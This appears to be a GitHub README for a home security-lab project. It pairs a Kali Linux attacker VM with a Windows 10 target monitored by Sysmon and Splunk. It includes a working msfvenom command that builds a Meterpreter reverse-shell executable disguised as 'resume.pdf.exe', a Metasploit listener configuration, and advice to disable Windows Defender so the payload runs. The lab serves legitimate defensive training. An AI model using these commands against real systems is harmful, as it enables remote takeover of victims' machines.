# 👨‍💻SOC Home Lab: Attack & Defense Simulation🚀

## Table of Contents
1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Network Topology](#network-topology)
4. [Step 1: Setting Up Virtual Machines](#step-1-setting-up-virtual-machines)
5. [Step 2: Installing Splunk for Log Monitoring](#step-2-installing-splunk-for-log-monitoring)
6. [Step 3: Installing Sysmon on Windows 10](#step-3-installing-sysmon-on-windows-10)
7. [Step 4: Generating Malware with msfvenom](#step-4-generating-malware-with-msfvenom)
8. [Step 5: Setting Up a Metasploit Listener](#step-5-setting-up-a-metasploit-listener)
9. [Step 6: Monitoring Logs with Splunk](#step-6-monitoring-logs-with-splunk)
10. [Troubleshooting](#troubleshooting)
11. [Next Steps & Future Improvements](#next-steps--future-improvements)
12. [How to Contribute](#how-to-contribute)
13. [Conclusion](#conclusion)

---
## 📌Introduction
This project demonstrates the setup of a home lab environment for cybersecurity testing, including an attack machine (Kali Linux), a target machine (Windows 10 VM), and a logging system (Splunk) to monitor malicious activities. The project involves:
- Setting up virtual machines
- Installing and configuring Sysmon for log collection
- Deploying malware using `msfvenom`
- Monitoring attacks using Splunk

---
## 🔧Prerequisites
| Requirement                  | Description                                      |
|------------------------------|--------------------------------------------------|
| **RAM**                      | At least **16GB** (to run multiple VMs)         |
| **Virtualization Software**  | VMware Workstation or VirtualBox                |
| **Operating Systems**        | ISO files for Windows 10 and Kali Linux         |
| **Logging Tools**            | Splunk and Sysmon setup files                   |
| **Internet Connection**      | Required for downloading and configuring tools  |

---
## Network Topology
Below is a simple network topology illustrating the setup:
```
   [Kali Linux (Attacker)]  --->  [Windows 10 VM (Target)]  --->  [Splunk (Log Monitoring)]
```
*The Kali Linux machine attacks the Windows VM, and logs are collected by Splunk for analysis.*

---
## Step 1: Setting Up Virtual Machines
### 1.1 Install Kali Linux (Attacker Machine)
1. Download **Kali Linux ISO** from [Kali Official Website](https://www.kali.org/downloads/).
2. Create a new VM in VMware/VirtualBox and install Kali Linux.
3. Update and upgrade Kali:
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

### 1.2 Install Windows 10 (Target Machine)
1. Download Windows 10 ISO from [Microsoft's website](https://www.microsoft.com/en-us/software-download/windows10ISO).
2. Create a new VM and install Windows 10.
3. Ensure **networking is enabled** for communication between VMs.

---
## Step 2: Installing Splunk for Log Monitoring
1. Download **Splunk Free** from [Splunk Website](https://www.splunk.com/).
2. Install Splunk on your Windows 10 VM.
3. Start Splunk and log in with admin credentials.
4. Enable **data collection** for monitoring logs.

---
## Step 3: Installing Sysmon on Windows 10
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Download a pre-configured `sysmonconfig.xml` from [Sysmon Modular](https://github.com/olafhartong/sysmon-modular).
3. Open **PowerShell as Administrator** and run:
   ```powershell
   cd "C:\Users\Downloads\sysmon"
   .\sysmon64.exe -i sysmonconfig.xml
   ```
4. Verify Sysmon is running:
   ```powershell
   Get-Process sysmon64
   ```

---
## Step 4: Generating Malware with msfvenom
On Kali Linux, generate a malicious executable:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe
```
- This creates `resume.pdf.exe`, which acts as our payload.

---
## Step 5: Setting Up a Metasploit Listener
1. Open Metasploit on Kali:
   ```bash
   msfconsole
   ```
2. Configure the listener:
   ```bash
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST <Attacker_IP>
   set LPORT 4444
   exploit
   ```
3. Deploy `resume.pdf.exe` on Windows 10 and execute it.
4. If successful, you gain a Meterpreter session:
   ```bash
   meterpreter > sysinfo
   ```

---
## Step 6: Monitoring Logs with Splunk
1. Open Splunk and search for unauthorized activity:
   ```
   index=main sourcetype=WinEventLog:Security
   ```
2. Identify anomalies related to unauthorized access.
3. Create alerts to detect suspicious behavior.

---
## 🔍Troubleshooting
### 1. Metasploit Handler Not Receiving a Session
- Ensure Windows Defender is **disabled** to prevent blocking the payload.
- Double-check **LHOST and LPORT settings** in both `msfvenom` and `msfconsole`.
- Run the payload on Windows as **Administrator**.

### 2. Splunk Not Logging Events
- Verify Sysmon is correctly installed and running.
- Ensure Windows Event Logging is enabled in Splunk.
- Restart Splunk and recheck the event index.

---
## 🎯Next Steps & Future Improvements
- Integrate **ELK Stack** for enhanced log analysis.
- Automate attack execution using **Python scripts**.
- Implement **Wazuh SIEM** for better threat detection.

---
## How to Contribute
Interested in improving this project? Contributions are welcome!
1. Fork the repository.
2. Create a new branch with your improvements.
3. Submit a pull request for review.

### GitHub Repository Badges:
![GitHub stars](https://img.shields.io/github/stars/xAHIINX00/SOC-Home-Lab-Attack-Defense-Simulation.svg)
![GitHub forks](https://img.shields.io/github/forks/xAHIINX00/SOC-Home-Lab-Attack-Defense-Simulation.svg)
![GitHub issues](https://img.shields.io/github/issues/xAHIINX00/SOC-Home-Lab-Attack-Defense-Simulation.svg)

---
## Conclusion
This project demonstrates how to:
- Set up a cybersecurity home lab
- Deploy and detect malware
- Use Splunk for threat monitoring

> **Note:** This is for educational purposes only. Do not use these techniques for unauthorized activities.

### 📌 Connect with Me:
- [LinkedIn](https://www.linkedin.com/in/ahinsunil-m) 
- [GitHub](https://github.com/xAHIINX00) 
